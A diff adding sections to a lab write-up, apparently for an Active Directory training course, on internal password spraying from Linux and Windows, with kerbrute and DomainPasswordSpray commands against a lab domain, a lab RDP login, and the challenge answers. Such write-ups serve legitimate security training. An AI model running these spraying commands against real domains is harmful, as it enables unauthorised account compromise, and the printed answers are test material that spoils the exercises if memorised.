@@ -10,6 +10,9 @@
 3. [Sighting In, Hunting For A User](#sighting-in-hunting-for-a-user)
     1. [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
     2. [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
+4. [Spray Responsibly](#spray-responsibly)
+    1. [Internal Password Spraying - from Linux](#internal-password-spraying---from-linux)
+    2. [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
 
 ## Initial Enumeration
 ### External Recon and Enumeration Principles
@@ -120,3 +123,36 @@
     kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
     ```
     The answer is `56`.
+
+## Spray Responsibly
+### Internal Password Spraying - from Linux
+#### Tools
+1. kerbrute
+2. crackmapexec
+#### Challenges
+1. Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.
+
+    In the previous challenges, we have found all valid user. Then we can save all valid user with the first letter *s* and run `kerbrute`.
+
+    ```bash
+    kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_user.txt Welcome1
+    ```
+    The answer is `sgage`.
+### Internal Password Spraying - from Windows
+#### Tools
+1. DomainPasswordSpray
+#### Challenges
+1. Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.
+
+    First, we need rdp to the target.
+
+    ```bash
+    xfreerdp /v:10.129.138.152 /u:htb-student /p:Academy_student_AD! /dynamic-resolution
+    ```
+    Then we can use `DomainPasswordSpray` to solve this.
+
+    ```powershell
+    Import-Module .\DomainPasswordSpray.ps1
+    Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
+    ```
+    The answer is `dbranch`.
